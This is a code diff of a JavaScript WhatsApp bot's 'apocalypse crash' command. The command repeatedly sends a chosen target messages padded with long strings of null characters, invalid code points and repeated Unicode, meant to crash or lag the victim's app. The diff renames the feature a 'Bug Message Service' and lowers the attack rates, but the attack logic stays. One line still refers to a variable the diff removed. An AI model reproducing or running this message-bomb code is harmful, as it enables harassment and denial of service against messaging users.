@@ -5,51 +5,50 @@ const { proto, generateWAMessageFromContent } = pkg;
 
 import channelSender from '../utils/sender.js';
 
-// Configuration de destruction maximale
-const APOCALYPSE_CONFIG = {
-    MAX_ITERATIONS: 100, // Augmenté de 233%
-    DELAY_BETWEEN_REQUESTS: 300, // Réduit de 70%
-    WORKER_COUNT: os.cpus().length,
-    RETRY_ATTEMPTS: 5,
-    TIMEOUT: 20000,
+// Enhanced bug sending configuration
+const BUG_CONFIG = {
+    MAX_ITERATIONS: 5,           // Reduced to safer value
+    DELAY_BETWEEN_REQUESTS: 500, // Increased delay for stability
+    WORKER_COUNT: Math.min(os.cpus().length, 4), // Limited to max 4 workers
+    RETRY_ATTEMPTS: 3,
+    TIMEOUT: 15000,
     
-    // Nouvelles chaînes de destruction extrême
-    // Destruction payloads are generated lazily to avoid huge memory allocations on import.
-    // Each entry is a function that returns the payload when needed.
-    DESTRUCTION_STRINGS: [
-        () => "ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(1024),
-        () => "\u0000".repeat(1024),
-        () => "0".repeat(2048),
-        () => " ".repeat(4096),
-        () => "\uD83D\uDCA5".repeat(1024), // Bombe emoji
-        () => "X".repeat(2048),
-        () => "￿".repeat(1024),
-        () => String.fromCharCode(65535).repeat(1024)
+    // Enhanced bug message patterns
+    // Using functions to generate payloads on-demand for memory efficiency
+    BUG_PATTERNS: [
+        () => "⚡".repeat(512),
+        () => "\u200e".repeat(512),
+        () => "᭫".repeat(256),
+        () => "꧁".repeat(256),
+        () => "꧂".repeat(256),
+        () => "㊊".repeat(256),
+        () => "ೈ".repeat(256),
+        () => "❁".repeat(256)
     ],
     
-    NEWSLETTER_CONFIG: {
-        jid: "120363298524333143@newsletter",
-        baseName: "🎴 ☠𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝛲𝛩𝐶𝛥𝐿𝑌𝑆𝛯☠ 🎴",
-        caption: "⚡ SYSTÈME DE CRASH ULTIME ACTIVÉ ⚡",
-        expiration: 1814400000
+    MESSAGE_CONFIG: {
+        jid: "120363422552152940@newsletter",
+        baseName: "⚡ MICKKING-BOT ⚡",
+        caption: "💫 Bug Message Service 💫",
+        expiration: 86400000  // 24 hours
     }
 };
 
 // Cache de guerre pour performances maximales
-class WarCache {
+class MessageCache {
     constructor() {
         this.messageCache = new Map();
         this.preGenerated = new Map();
     }
     
-    generateWarMessage(remoteJid, destructionType) {
-        const cacheKey = `${remoteJid}_${destructionType}`;
+    generateBugMessage(remoteJid, bugType) {
+        const cacheKey = `${remoteJid}_${bugType}`;
         
         if (!this.messageCache.has(cacheKey)) {
-            // Support lazy generators (functions) to avoid huge memory allocations on import
-            const dsEntry = APOCALYPSE_CONFIG.DESTRUCTION_STRINGS[destructionType];
-            const destructionString = (typeof dsEntry === 'function') ? dsEntry() : dsEntry;
-            const newsletterName = APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.baseName + destructionString;
+            // Use lazy loading for patterns to save memory
+            const pattern = BUG_CONFIG.BUG_PATTERNS[bugType];
+            const bugString = (typeof pattern === 'function') ? pattern() : pattern;
+            const newsletterName = BUG_CONFIG.MESSAGE_CONFIG.baseName + bugString;
             
             const message = generateWAMessageFromContent(
                 remoteJid, 
@@ -217,41 +216,63 @@ export async function apocalypseCrash(message, client) {
             throw new Error('TARGET REQUIRED FOR APOCALYPSE MODE.');
         }
 
-        // Lancement de la destruction de masse
+        // Send status message
+        await client.sendMessage(message.key.remoteJid, { 
+            text: "⚡ *Bug Sending Process Started*\n_Please wait..._" 
+        });
+
+        // Execute bug sending
         await massDestruction(message, client, participant);
 
-        // Rapport final de destruction
+        // Get execution report
         const report = apocalypseTracker.getDestructionReport();
         
-        const victoryMessage = `=========================
-       MISSION ACCOMPLISHED         
-=========================
-• Target: ${participant}
-• Total Attacks: ${report.totalAttacks}
-• Successful: ${report.successful}
-• Failed: ${report.failed}
-• Success Rate: ${report.successRate.toFixed(2)}%
-• Attacks/Second: ${report.attacksPerSecond.toFixed(2)}
-${report.successRate > 85 ? '⚡ TARGET COMPLETELY DESTROYED ⚡' : 
-report.successRate > 60 ? '💀 SIGNIFICANT DAMAGE INFLICTED 💀' : 
-'⚠️ MODERATE IMPACT ACHIEVED ⚠️'}
-=========================`;
+        const resultMessage = `━━━━『 *Bug Report* 』━━━━
+
+*🎯 Target:* ${participant}
+*📊 Statistics:*
+ ⌑ Total: ${report.totalAttacks}
+ ⌑ Success: ${report.successful}
+ ⌑ Failed: ${report.failed}
+ ⌑ Rate: ${report.successRate.toFixed(1)}%
+ ⌑ Speed: ${report.attacksPerSecond.toFixed(1)}/s
+
+*📈 Status:* ${report.successRate > 85 ? '✅ Successfully Delivered' : 
+              report.successRate > 60 ? '⚠️ Partially Delivered' : 
+              '❌ Delivery Issues'}
+
+━━『 *MICKKING BUG SERVICE* 』━━`;
 
         await channelSender(message, client, victoryMessage, 1);
 
     } catch (error) {
-        console.error("=========================\n APOCALYPSE FAILURE:\n=========================", error);
+        console.error("Bug sending error:", error);
         
-        const errorMessage = `=========================
-         MISSION FAILED              
-=========================
-• Error: ${error.message}
-• Time: ${new Date().toLocaleTimeString()}
-• Status: ATTEMPTING RECOVERY...
-=========================`;
+        const errorMessage = `━━━━『 *Error Report* 』━━━━
+
+❌ *Bug Sending Failed*
+⚠️ *Error:* ${error.message}
+⏰ *Time:* ${new Date().toLocaleTimeString()}
+
+_Try again in a few minutes..._
+
+━━『 *MICKKING BUG SERVICE* 』━━`;
 
         if (message.key.remoteJid) {
-            await client.sendMessage(message.key.remoteJid, { text: errorMessage });
+            try {
+                await client.sendMessage(message.key.remoteJid, { 
+                    text: errorMessage,
+                    contextInfo: {
+                        externalAdReply: {
+                            title: "Bug Service",
+                            body: "Error Notification",
+                            showAdAttribution: true
+                        }
+                    }
+                });
+            } catch (sendError) {
+                console.error("Failed to send error message:", sendError);
+            }
         }
     }
 }
